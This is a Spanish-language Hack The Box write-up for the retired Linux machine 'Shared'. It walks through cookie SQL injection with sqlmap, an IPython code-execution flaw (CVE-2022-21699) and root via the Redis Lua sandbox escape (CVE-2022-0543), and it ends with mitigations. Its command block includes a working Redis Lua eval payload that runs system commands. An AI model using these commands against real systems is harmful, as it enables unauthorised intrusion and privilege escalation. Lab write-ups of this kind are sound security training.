---
machine: Shared
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, sqli, ipython, cve-2022-21699, redis, lua]
---

# Shared — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Una SQLi en la cookie de la tienda filtra credenciales para SSH. Dentro del host, un fallo de ejecución de IPython (CVE-2022-21699) permite pivotar; el reversing de un binario revela credenciales de Redis y la CVE-2022-0543 del sandbox Lua de Debian da root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80,6379 <IP>
sqlmap --url "http://shared.htb/" --cookie="custom_cart=*" --batch --dump
ssh <USER>@<IP> -p 22
# IPython
ipython
# Binario con credenciales
strings /usr/local/bin/<BIN> | grep -i redis
# Redis CVE-2022-0543
redis-cli -h 127.0.0.1
eval 'local f=package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0","luaopen_io"); local io=f(); io.popen("id"):read("*a")' 0
```

## Enumeración

- Tienda con cookie de sesión concatenada a una consulta SQL.
- IPython con un directorio de historial o perfil compartido.
- Redis expuesto y binario propio con credenciales embebidas.

## Acceso inicial

La cookie `custom_cart` se usa sin parametrizar; con `sqlmap --cookie` se enumeran tablas y se recuperan usuarios y contraseñas. Una de ellas es válida para SSH.

## Escalada de privilegios

IPython procesa un archivo o perfil controlable y ejecuta código (CVE-2022-21699), lo que permite pasar a otro usuario. Ese usuario ejecuta un binario que contiene credenciales de Redis; con ellas se usa la CVE-2022-0543 para escapar del sandbox Lua y ejecutar como root.

## Evidencia

- Cookie vulnerable y volcado SQLi.
- Acceso SSH inicial.
- IPython ejecutando comandos y Redis con Lua fuera del sandbox.

## Lecciones aprendidas

- Las cookies no son datos de confianza para SQL.
- Los perfiles de IPython son código ejecutable.
- Redis con Lua y paquetes Debian antiguos puede escapar del sandbox.

## Mitigación y detección

- Parametrizar consultas y firmar cookies.
- Aislar perfiles de IPython y revisar su contenido.
- Actualizar Redis y restringir su acceso a localhost.

## Referencias

- [0xdf — Shared](https://0xdf.gitlab.io/2022/11/12/htb-shared.html)
- [NVD — CVE-2022-21699](https://nvd.nist.gov/vuln/detail/CVE-2022-21699)
- [Hack The Box — Shared](https://app.hackthebox.com/machines/shared)
